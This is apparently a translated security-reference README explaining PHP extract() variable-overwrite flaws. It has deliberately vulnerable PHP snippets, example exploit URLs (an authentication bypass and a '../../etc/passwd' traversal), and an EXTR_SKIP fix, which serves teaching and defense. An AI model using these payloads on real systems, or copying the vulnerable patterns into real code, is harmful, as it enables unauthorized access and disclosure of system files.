[原文文档](README.en.md)

# 外部变量修改

> 外部变量修改漏洞发生在 Web 应用程序不正确处理用户输入时，允许攻击者覆盖内部变量。在 PHP 中，如果 `extract($_GET)`、`extract($_POST)` 或 `import_request_variables()` 等函数在没有适当验证的情况下将用户控制的数据导入全局作用域，则可能被滥用。这可能导致安全问题，如对应用程序逻辑的未经授权的更改、特权提升或绕过安全控制。

## 摘要

* [方法论](#methodology)
    * [覆盖关键变量](#overwriting-critical-variables)
    * [文件包含投毒](#poisoning-file-inclusion)
    * [全局变量注入](#global-variable-injection)
* [修复](#remediations)
* [参考资料](#references)

## 方法论

PHP 中的 `extract()` 函数将数组中的变量导入到当前符号表中。虽然看起来很方便，但它可能引入严重的安全风险，特别是在处理用户提供的数据时。

* 它允许覆盖现有变量。
* 它可能导致**变量污染**，影响安全机制。
* 它可以用作**工具**来触发其他漏洞，如远程代码执行（RCE）和本地文件包含（LFI）。

默认情况下，`extract()` 使用 `EXTR_OVERWRITE`，这意味着如果它们与输入数组中的键具有相同名称，**它会替换现有变量**。

### 覆盖关键变量

如果 `extract()` 在依赖特定变量的脚本中使用，攻击者可以操纵它们。

```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```

**利用：**

在这个例子中，`extract($_GET)` 的使用允许攻击者将 `$authenticated` 变量设置为 `true`：

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### 文件包含投毒

如果 `extract()` 与文件包含结合，攻击者可以控制文件路径。

```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```

**利用：**

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### 全局变量注入

:warning: 从 PHP 8.1.0 开始，不再支持对整个 `$GLOBALS` 数组的写访问。

当应用程序对不可信值调用 `extract` 函数时覆盖 `$GLOBALS`：

```php
extract($_GET);
```

攻击者可以操纵**全局变量**：

```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```

## 修复

使用 `EXTR_SKIP` 防止覆盖：

```php
extract($_GET, EXTR_SKIP);
```

## 参考资料

* [CWE-473: PHP 外部变量修改 - 通用缺陷枚举 - 2024年11月19日](https://cwe.mitre.org/data/definitions/473.html)
* [CWE-621: 变量提取错误 - 通用缺陷枚举 - 2024年11月19日](https://cwe.mitre.org/data/definitions/621.html)
* [函数 extract - PHP 文档 - 2001年3月21日](https://www.php.net/manual/en/function.extract.php)
* [$GLOBALS 变量 - PHP 文档 - 2008年4月30日](https://www.php.net/manual/en/reserved.variables.globals.php)
* [The Ducks - HackThisSite - 2016年12月14日](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)
* [Extracttheflag! - Orel / WindTeam - 2024年2月28日](https://ctftime.org/writeup/38076)